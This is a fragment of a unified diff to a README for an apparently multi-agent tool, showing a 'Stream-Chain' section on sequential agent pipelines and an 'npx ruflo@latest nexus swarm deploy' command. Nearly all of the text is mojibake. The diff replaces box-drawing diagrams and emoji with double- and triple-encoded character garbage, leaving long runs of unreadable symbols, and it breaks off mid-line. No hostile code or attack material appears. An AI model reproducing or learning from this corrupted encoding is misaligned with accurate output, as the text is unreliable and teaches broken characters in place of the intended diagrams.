ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“                 ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“
 ```
 
 ### Skills for Flow Nexus
@@ -5838,23 +5838,23 @@ npx ruflo@latest nexus swarm deploy
 ---
 
 <details>
-<summary>Ã°Å¸â€â€” <strong>Stream-Chain</strong> Ã¢â‚¬â€ Multi-Agent Pipelines</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬ÂÃ¢â‚¬â€ <strong>Stream-Chain</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Multi-Agent Pipelines</summary>
 
 Stream-Chain enables **sequential processing** where the output of one agent becomes the input of the next.
 
 ### Pipeline Concept
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š                     STREAM-CHAIN PIPELINE                           Ã¢â€â€š
-Ã¢â€Å“Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â¤
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Input Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶ [Agent 1] Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶ [Agent 2] Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶ [Agent 3] Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶ Output        Ã¢â€â€š
-Ã¢â€â€š            (Research)    (Implement)   (Test)                       Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€š  Each stage transforms and passes data to the next                  Ã¢â€â€š
-Ã¢â€â€š                                                                     Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                     STREAM-CHAIN PIPELINE                           ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€œÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â¤
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Input ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ [Agent 1] ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ [Agent 2] ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ [Agent 3] ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ Output        ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡            (Research)    (Implement)   (Test)                       ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  Each stage transforms and passes data to the next                  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡                                                                     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ